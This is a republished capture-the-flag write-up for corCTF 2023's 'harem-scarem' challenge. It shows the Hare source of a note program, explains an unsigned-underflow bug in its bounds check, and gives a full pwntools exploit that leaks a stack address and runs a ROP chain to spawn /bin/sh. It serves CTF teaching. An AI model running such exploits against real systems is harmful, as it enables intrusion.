---
title: corCTF 2023 - harem-scarem write-up
url: https://buaq.net/go-173799.html
source: unSafe.sh - 不安全
date: 2023-08-07
fetch_date: 2025-10-04T11:58:52.929164
---

# corCTF 2023 - harem-scarem write-up

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/10c37255312fe5c7c44947fe192ffea3.jpg)

corCTF 2023 - harem-scarem write-up

Hello, folks! It’s been a long time since my last write-up and there goes a short one. Harem scar
*2023-8-6 20:0:0
Author: [fireshellsecurity.team(查看原文)](/jump-173799.htm)
阅读量:37
收藏*

---

![hare lang](https://i.imgur.com/RlAd1vV.png)

Hello, folks! It’s been a long time since my last write-up and there goes a short one. Harem scarem was a cool challenge from corCTF. It was a pwnable challenge, at first sight, We though it was about some fancy heap exploitation, but, turns out it was much simpler.

The source code of the challenge was provided and you can check it below.

```
use fmt;
use bufio;
use bytes;
use os;
use strings;
use unix::signal;

const bufsz: u8 = 8;

type note = struct {
    title: [32]u8,
    content: [128]u8,
    init: bool,
};

fn ptr_forward(p: *u8) void = {
    if (*p == bufsz - 1) {
        fmt::println("error: out of bounds seek")!;
    } else {
        *p += 1;
    };
    return;
};

fn ptr_back(p: *u8) void = {
    if (*p - 1 < 0) {
        fmt::println("error: out of bounds seek")!;
    } else {
        *p -= 1;
    };
    return;
};

fn note_add(note: *note) void = {
    fmt::print("enter your note title: ")!;
    bufio::flush(os::stdout)!;
    let title = bufio::scanline(os::stdin)! as []u8;
    let sz = if (len(title) >= len(note.title)) len(note.title) else len(title);
    note.title[..sz] = title[..sz];
    free(title);

    fmt::print("enter your note content: ")!;
    bufio::flush(os::stdout)!;
    let content = bufio::scanline(os::stdin)! as []u8;
    sz = if (len(content) >= len(note.content)) len(note.content) else len(content);
    note.content[..sz] = content[..sz];
    free(content);
    note.init = true;
};

fn note_delete(note: *note) void = {
    if (!note.init) {
        fmt::println("error: no note at this location")!;
        return;
    };
    bytes::zero(note.title);
    bytes::zero(note.content);
    note.init = false;
    return;
};

fn note_read(note: *note) void = {
    if (!note.init) {
        fmt::println("error: no note at this location")!;
        return;
    };
    fmt::printfln("title: {}\ncontent: {}",
        strings::fromutf8_unsafe(note.title),
        strings::fromutf8_unsafe(note.content)
    )!;
    return;
};

fn handler(sig: int, info: *signal::siginfo, ucontext: *void) void = {
  fmt::println("goodbye :)")!;
  os::exit(1);
};

export fn main() void = {
    signal::handle(signal::SIGINT, &handler);
    let idx: u8 = 0;
    let opt: []u8 = [];
    let notes: [8]note = [
            note { title = [0...], content = [0...], init = false}...
    ];
    let notep: *[*]note = &notes;
    assert(bufsz == len(notes));
    for (true) {
        fmt::printf(
"1) Move note pointer forward
2) Move note pointer backward
3) Add note
4) Delete note
5) Read note
6) Exit
> ")!;
        bufio::flush(os::stdout)!;
        opt = bufio::scanline(os::stdin)! as []u8;
        defer free(opt);
        switch (strings::fromutf8(opt)!) {
            case "1" => ptr_forward(&idx);
            case "2" => ptr_back(&idx);
            case "3" => note_add(&notep[idx]);
            case "4" => note_delete(&notep[idx]);
            case "5" => note_read(&notep[idx]);
            case "6" => break;
            case => fmt::println("Invalid option")!;
        };
    };
};
```

Correct me if I’m wrong, but we believe the challenge was written in [Hare programming language](https://harelang.org/).

Driving through the source code, we can figure out the vulnerability, it lies in the `ptr_back` function:

```
fn ptr_back(p: *u8) void = {
    if (*p - 1 < 0) {
        fmt::println("error: out of bounds seek")!;
    } else {
        *p -= 1;
    };
    return;
};
```

The type of `p` is unsigned, so `*p-1` will never be less than 0. We can make `idx` be equal to `0xa` and get `$RIP` control. Also, we can leak the `stack address` through the function `note_read`.

## Exploit

The full exploit is provided below.

```
#!/usr/bin/env python
from pwn import *
import sys

def pa(addr):
  info("%#x", addr)

def move_ptr_back():
  p.sendlineafter(b'>', b'2')

def note_add(title, content):
  p.sendlineafter(b'>', b'3')
  p.sendlineafter(b'title:', title)
  p.sendlineafter(b'content:', content)

def read_note():
  p.sendlineafter(b'>', b'5')

def exploit():
  for i in range(246):
    move_ptr_back()

  if REMOTE:
    note_add(b'AAA', b'BBB')

  # leak stack address
  read_note()
  p.recvuntil('content:')
  p.recv(15)
  stack_leak = u64(p.recv(8))
  pa(stack_leak)

  rop_chain =  b'B' * 14
  rop_chain += p64(stack_leak+8)  # RBP -> RSP+8
  rop_chain += p64(0x800496b)     # clc ; mov rax, qword ptr [rbp - 8] ; leave ; ret)
  rop_chain += p64(0x3b)          # execve syscall number
  rop_chain += p64(stack_leak+48) # RBP -> RSP+48
  rop_chain += p64(0x80169cc)     # pop rsi ; pop r13 ; pop r12 ; pop rbx ; leave ; ret
  rop_chain += p64(stack_leak+32) # rsi
  rop_chain += b'/bin/sh\x00'     # r13
  rop_chain += p64(0)             # r12
  rop_chain += p64(0xbabebabe)    # rbx
  rop_chain += p64(0x801a452)     # clc ; mov rdi, rsi ; mov rsi, rdx ; syscall

  note_add(b'AAABBBCCC', rop_chain)

  p.interactive()

if __name__ == '__main__':
  REMOTE = len(sys.argv) > 1

  if REMOTE:
    p = remote(sys.argv[1], int(sys.argv[2]))
    p.recvuntil('-s ')
    pof_ps = process(['./pow', p.recvline().strip()])
    pof = pof_ps.readline()
    p.sendline(pof)
  else:
    p = process(['./harem'])

  exploit()
```

[Capture the Flag](https://fireshellsecurity.team/ctf/)
,
[Hare programming language](https://fireshellsecurity.team/harelang/)
,
[Pwnable](https://fireshellsecurity.team/pwn/)
,
[Writeup](https://fireshellsecurity.team/writeup/)

文章来源: https://fireshellsecurity.team/corctf2023-harem-scarem/
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)